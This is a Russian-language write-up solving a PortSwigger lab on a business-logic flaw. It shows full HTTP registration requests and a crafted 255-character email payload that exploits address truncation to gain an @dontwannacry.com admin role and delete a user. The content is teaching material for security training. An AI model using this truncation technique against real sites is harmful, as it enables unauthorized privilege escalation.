---
title: "Inconsistent handling of exceptional input"
date: 2025-10-23
tags: [web, writeup]  
categories: [PortSwigger]
tagline: ""
header:
  overlay_image: /assets/images/IMG_writeups/IMG_PortSwigger/ps_logo.webp
  overlay_filter: 0.5 
  overlay_color: "#fff"
  actions:
    - label: "Lab PortSwigger"
      url: "https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-inconsistent-handling-of-exceptional-input"
classes: wide
---

В лабе плохо валидируется ввод. Для решения нужно получить доступ к панели администратора и удалить пользователя `carlos`.

```
https://0aec001f0315d694808776da000c00bf.web-security-academy.net/
```

# Solution

Попробую зарегистрироваться на сайте.

```http
POST /register HTTP/2
Host: 0aec001f0315d694808776da000c00bf.web-security-academy.net
Cookie: session=YllAjaKC7P1WXFK16u5nBoQ7MfbpCd4F
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:144.0) Gecko/20100101 Firefox/144.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0aec001f0315d694808776da000c00bf.web-security-academy.net/register
Content-Type: application/x-www-form-urlencoded
Content-Length: 146
Origin: https://0aec001f0315d694808776da000c00bf.web-security-academy.net
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

csrf=zdYUHH7AEaRsWIp7nvMjWaGKH3cZUZOu&username=name&email=attacker%40exploit-0aab00d803fad6a58091759a01fb00c8.exploit-server.net&password=11223344
```

Я не знаю что или кто это, но я неприменно от них.

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_blv/IMG_inconsistent-handling-of-exceptional-input/2.png){: height="200" .align-center}

Это как-то должно проверяться. Попробую вставить почту, а потом уже этот домен:

```http
POST /register HTTP/2
Host: 0aec001f0315d694808776da000c00bf.web-security-academy.net
Cookie: session=YllAjaKC7P1WXFK16u5nBoQ7MfbpCd4F
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:144.0) Gecko/20100101 Firefox/144.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0aec001f0315d694808776da000c00bf.web-security-academy.net/register
Content-Type: application/x-www-form-urlencoded
Content-Length: 165
Origin: https://0aec001f0315d694808776da000c00bf.web-security-academy.net
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

csrf=zdYUHH7AEaRsWIp7nvMjWaGKH3cZUZOu&username=name1&email=attacker%40exploit-0aab00d803fad6a58091759a01fb00c8.exploit-server.net@dontwannacry.com&password=11223344
```

Не прокатило. Разные разделители я тоже попробовал. А почему нет, если да. Попробую сделать длинную почту. Домен все равно мой.

```http
POST /register HTTP/2
Host: 0aec001f0315d694808776da000c00bf.web-security-academy.net
Cookie: session=YllAjaKC7P1WXFK16u5nBoQ7MfbpCd4F
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:144.0) Gecko/20100101 Firefox/144.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0aec001f0315d694808776da000c00bf.web-security-academy.net/register
Content-Type: application/x-www-form-urlencoded
Content-Length: 347
Origin: https://0aec001f0315d694808776da000c00bf.web-security-academy.net
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

csrf=zdYUHH7AEaRsWIp7nvMjWaGKH3cZUZOu&username=name1&email=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaattacker%40exploit-0aab00d803fad6a58091759a01fb00c8.exploit-server.net&password=11223344
```

Нас обрезали)

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_blv/IMG_inconsistent-handling-of-exceptional-input/1.png){: height="200" .align-center}

```python
>>> s = 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaattacker@exploit-0aab00d803fad6a58091759a01fb00c8.explo'
>>> len(s)
255
```

Строка имеет длину `255`.

Попробую скрафтить пейлоад так, чтобы `name` + `@dontwannacry.com` были равны по длине `255`, а далее добавлю`exploit-0aab00d803fad6a58091759a01fb00c8.exploit-server.net`:

```
oooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo@dontwannacry.com.exploit-0aab00d803fad6a58091759a01fb00c8.exploit-server.net
```

Отправлю:

```http
POST /register HTTP/2
Host: 0aec001f0315d694808776da000c00bf.web-security-academy.net
Cookie: session=UHNhJJEiNwfSjQ82w5Sj8QLoiqIdJq5x
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:144.0) Gecko/20100101 Firefox/144.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0aec001f0315d694808776da000c00bf.web-security-academy.net/register
Content-Type: application/x-www-form-urlencoded
Content-Length: 383
Origin: https://0aec001f0315d694808776da000c00bf.web-security-academy.net
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

csrf=S6QwN8oGurEn0etIEdkxg7w6sJj2axjx&username=1&email=oooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo%40dontwannacry.com.exploit-0aab00d803fad6a58091759a01fb00c8.exploit-server.net&password=1
```

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_blv/IMG_inconsistent-handling-of-exceptional-input/3.png){: height="200" .align-center}

А вот и админ панель:

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_blv/IMG_inconsistent-handling-of-exceptional-input/4.png){: height="200" .align-center}

`carlos` удален, значит лаба решена.

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_blv/IMG_inconsistent-handling-of-exceptional-input/5.png){: height="200" .align-center}